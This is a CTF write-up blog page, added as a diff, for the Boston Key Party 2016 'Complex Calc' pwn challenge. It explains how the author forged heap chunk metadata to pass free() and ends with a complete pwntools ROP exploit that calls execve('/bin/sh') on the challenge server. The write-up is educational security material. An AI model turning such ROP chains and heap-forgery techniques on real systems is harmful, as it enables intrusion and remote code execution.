@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+
+
+
+<title>
+  Grazfather - Boston Key Party - PWN 5 ‘Complex Calc’ 
+</title>
+
+<meta name="generator" content="Hugo 0.73.0" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,400|Roboto+Slab:400,700|Roboto:300,300i,400,400i,500,500i,700,700i">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
+<link rel="stylesheet" href="https://grazfather.github.io/css/main.css">
+<link rel="stylesheet" href="https://grazfather.github.io/css/custom.css">
+
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="theme-color" content="#ffffff">
+
+</head>
+<body lang="en-US">
+<div class="container">
+
+
+<header class="row text-left title">
+  <h1 class="title">Boston Key Party - PWN 5 ‘Complex Calc’</h1>
+</header>
+<section id="category-pane" class="row meta">
+  
+  <div class="col-md-12">
+    <h6 class="text-left meta">
+        PUBLISHED ON MAR 6, 2016 
+      
+      
+      
+      —
+      
+      
+      <a class="meta" href="/categories/ctf">CTF</a>, 
+      
+      <a class="meta" href="/categories/pwn">PWN</a>
+      
+      
+      
+    </h6>
+  </div>
+  
+</section>
+<section id="content-pane" class="row">
+  <div class="col-md-12 text-justify content">
+    
+    <nav id="TableOfContents"></nav>
+    
+    <p>Taking a quick look at this binary, we see it&rsquo;s almost idenfical to the &lsquo;Simple Calc&rsquo;. Testing my ROP chain on it, however, crashes in <code>free</code>: It looks like <code>free(0)</code> won&rsquo;t fly anymore.</p>
+<p>To confirm that my ROP was still valid, I set a breakpoint on the call to <code>free</code> and manually wrote the pointer to the original buffer into RDI. With this, my ROP indeed did work and I could focus on passing the <code>free</code> call.</p>
+<p>Peeking into the implementation of <code>free</code>, we see that a few NOPs were added to prevent us from providing 0 as the pointer. Looking a bit further, we see <code>[rdi-8]</code> and <code>[rdi-10h]</code> are referenced. That means that the metadata for the structure exists just <em>before</em> the block.</p>
+<p>Breaking on the <code>malloc</code> call, and inspecting the memory around, we see that 16 bytes before the returned pointer seems to be always null, while -8 is some odd number. Playing around with the number of calculations requested we see that this number grows with size: It&rsquo;s the size of the block, plus the size of the metadata, then aligned to some multiple of 16.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">0x000000000040143f in main <span style="color:#f92672">()</span>
+gdb-peda$ x/4gx $rax - 0x10
+0x6c8bc0:       0x0000000000000000      0x0000000000000021
+0x6c8bd0:       0x0000000000000000      0x0000000000000000</code></pre></div>
+<p>I got lucky in that I already know about how free works to not have to figure out why the size value is odd: The low bit represents whether or not the allocation is in use. When <code>free</code> is called, the bit is set to 0, but also the next block is checked. If that block is also not in use, then the two blocks are coalesced. This is to try to prevent memory fragmentation.</p>
+<p>The next block can easily be found by adding the size to the current allocation:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ x/4gx $rax - 0x10 + 0x20
+0x6c8be0:       0x0000000000000000      0x0000000000020421
+0x6c8bf0:       0x0000000000000000      0x0000000000000000</code></pre></div>
+<p>If we want the <code>free</code> call to pass, then we are going to need to pass it a pointer memory that has what looks like a valid malloc block 16 bytes before it. On top of that, we need the <em>next</em> block (determined by adding the <em>size</em> to the pointer) has a <em>size</em> value that is odd, to prevent coalescing.</p>
+<p>Luckily for us, we can do just that: In our last ROP we only needed a few of the global vars (<code>sub</code> and <code>divv</code>), leaving us <code>add</code> and <code>mul</code> to fill with allocation metadata. Testing with a valid allocation, I confirmed that garbage data at -0x10 doesn&rsquo;t seem to affect the freeing, making our job easier.</p>
+<p>Since the ROP is the same, we should only need a few changes:</p>
+<ol>
+<li>Instead of writing NULL on the stack, we need to be careful to overwrite the buf pointer with a pointer to our fake allocation.</li>
+<li>We need to write two blocks of junk metadata. The first must have a size that is the correct distance away from the second and have the low bit set. The second must only have the low bit set.</li>
+</ol>
+<p>I spent <em>way</em> too much time trying to make these metadata blocks contiguous (16 bytes apart), but eventually realized that the minimum distance is the minimum alloc (1) plus the size of the metadata (16) rounded up. Lucky for us, <code>add</code> and <code>mul</code> are indeed that distance apart.</p>
+<p>I populated the first block by providing two numbers to the app opration whose sum is 0x21. This required a negative number, since there was an unsigned check to ensure the operant is greater than 39.</p>
+<p>The second number was easier: I just needed to populate it with any odd number, and the result of 41*41 fit the bill.</p>
+<p>What&rsquo;s important to note is that I don&rsquo;t provide <code>free</code> a pointer to the metadata, but 16 bytes beyond that, which is <code>divv</code>, where I had placed the string &ldquo;/bin/sh\0&rdquo;. This, I would find out, is very important&hellip;</p>
+<p>Excitedly running the new exploit and&hellip; crash. Wtf? Breaking into it with a debugger and following through the ROP, I saw that my string had been wiped out. Stepping through main, I realized that because I was freeing <code>divv</code>, it was getting zeroed out.</p>
+<p>Now the issue I had with &lsquo;Simple Calc&rsquo; ended up helping me out: Because I had had to find and use a write mem gadget to get rid of <code>_dl_tls_static_used</code>, I was prepared for this: Instead of writing to the global <code>divv</code> using calculation caching, I would instead write it <em>after</em> the free as extra ROPs.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> struct
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_addr</span>(addr):
+    <span style="color:#66d9ef">return</span> ADD <span style="color:#f92672">+</span> str(addr<span style="color:#f92672">-</span><span style="color:#ae81ff">40</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;40</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> NULL
+
+<span style="color:#75715e"># Commands</span>
+ADD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+SUB <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+MUL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;3</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+DIV <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+DONE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;5</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+NULL <span style="color:#f92672">=</span> SUB<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;40</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;40</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#75715e"># Gadgets</span>
+POP_RDI <span style="color:#f92672">=</span> write_addr(<span style="color:#ae81ff">0x00401b73</span>)
+POP_RAX <span style="color:#f92672">=</span> write_addr(<span style="color:#ae81ff">0x0044db34</span>)
+POP_RDX <span style="color:#f92672">=</span> write_addr(<span style="color:#ae81ff">0x00437a85</span>)
+POP_RSI <span style="color:#f92672">=</span> write_addr(<span style="color:#ae81ff">0x00401c87</span>)
+MOV_EDX_TO_AT_RAX <span style="color:#f92672">=</span> write_addr(<span style="color:#ae81ff">0x0044526f</span>)
+SYSCALL <span style="color:#f92672">=</span> write_addr(<span style="color:#ae81ff">0x004648e5</span>)
+<span style="color:#75715e"># Globals</span>
+addX <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6C4A80</span>
+addY <span style="color:#f92672">=</span> addX <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+addRes <span style="color:#f92672">=</span> addY <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+divX <span style="color:#f92672">=</span> addRes <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
+divY <span style="color:#f92672">=</span> divX <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+divRes <span style="color:#f92672">=</span> divY <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+mulX <span style="color:#f92672">=</span> divRes <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
+mulY <span style="color:#f92672">=</span> mulX <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+mulRes <span style="color:#f92672">=</span> mulY <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+subX <span style="color:#f92672">=</span> mulRes <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>
+subY <span style="color:#f92672">=</span> subX <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+subRes <span style="color:#f92672">=</span> subY <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+_dl_tls_static_used <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6C4AC0</span>
+
+<span style="color:#75715e"># Build commands</span>
+commands <span style="color:#f92672">=</span> [
+    <span style="color:#e6db74">&#34;100</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,  <span style="color:#75715e"># Any large number</span>
+    write_addr(addX<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">9</span>,  <span style="color:#75715e"># Fill stack with address of divX. This will wipe it out :(</span>
+    <span style="color:#75715e"># Set _dl_tls_static_used to 0</span>
+    POP_RAX,
+    write_addr(_dl_tls_static_used),
+    POP_RDX,
+    NULL, NULL,
+    MOV_EDX_TO_AT_RAX,
+    <span style="color:#75715e"># Put &#34;/bin/sh&#34; at divX using ROP</span>
+    POP_RAX,
+    write_addr(divX),
+    POP_RDX,
+    write_addr(struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin&#34;</span>)[<span style="color:#ae81ff">0</span>]),
+    MOV_EDX_TO_AT_RAX,
+    POP_RAX,
+    write_addr(divY),
+    POP_RDX,
+    write_addr(struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">0</span>]),
+    MOV_EDX_TO_AT_RAX,
+    <span style="color:#75715e"># Now get ready for syscall</span>
+    POP_RDI,
+    write_addr(divX),  <span style="color:#75715e"># divX holds the string &#34;/bin/sh&#34;</span>
+    POP_RAX,
+    SUB <span style="color:#f92672">+</span> str(<span style="color:#ae81ff">0x3b</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;4096</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> NULL,  <span style="color:#75715e"># 0x3b = execve</span>
+    POP_RDX,
+    NULL, NULL,  <span style="color:#75715e"># RDX should be null</span>
+    POP_RSI,  <span style="color:#75715e"># RSI should point to an array that has a pointer to &#34;/bin/sh&#34; and a null pointer</span>
+    write_addr(subY),
+    SYSCALL,
+    <span style="color:#75715e"># Now we need to populate the global vars by running extra calcs</span>
+    <span style="color:#75715e"># -- Put pointer to divX at subY with null after</span>
+    SUB <span style="color:#f92672">+</span> str(divX) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> str(divX) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
+    <span style="color:#75715e"># Now we need to put two malloc blocks in add and mul</span>
+    <span style="color:#75715e"># The first 8 bytes (x and y) don&#39;t matter, it&#39;s the result that does</span>
+    ADD <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;-123</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;156</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,  <span style="color:#75715e"># sum is 0x21</span>
+    MUL <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;41</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;41</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,  <span style="color:#75715e"># product is odd</span>
+    DONE
+]
+
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;simplecalc.bostonkey.party&#34;</span>, <span style="color:#ae81ff">5500</span>)
+garbage <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recv()
+r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(commands))
+r<span style="color:#f92672">.</span>interactive()</code></pre></div>
+
+  </div>
+</section>
+<section id="tag-pane" class="row meta">
+  
+  <div class="col-md-12">
+    <h6 class="text-right meta">
+      
+    </h6>
+  </div>
+  
+</section>
+
+
+
+
+
+
+
+
+<section id="menu-pane" class="row menu text-center">
+  
+  
+  <span><a class="menu-item" href="https://grazfather.github.io/posts/2016-03-06-bkp-pwn5-simple-calc/">&lt; prev | </a></span>
+  
+  
+  <span><a class="menu-item" href="/posts">posts</a></span>
+  
+  
+  <span><a class="menu-item" href="https://grazfather.github.io/posts/2016-04-01-reading-february-march-2016/"> | next &gt;</a></span>
+  
+  
+  <h4 class="text-center"><a class="menu-item" href="https://grazfather.github.io">home</a></h4>
+</section>
+
+
+
+<footer class="row text-center footer">
+  <hr />
+  
+  <h6 class="text-center copyright"></h6>
+  
+      
+      <h6><a href="" aria-label="RSS Feed"><i class="fas fa-rss" aria-hidden="true"></i></a></h6>
+    
+  
+</footer>
+
+</div>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  
+
+<script type="text/javascript">
+hljs.initHighlightingOnLoad();
+</script>
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="js/main.js"></script>
+<script src="js/custom.js"></script>
+</body>
+</html>
+
+
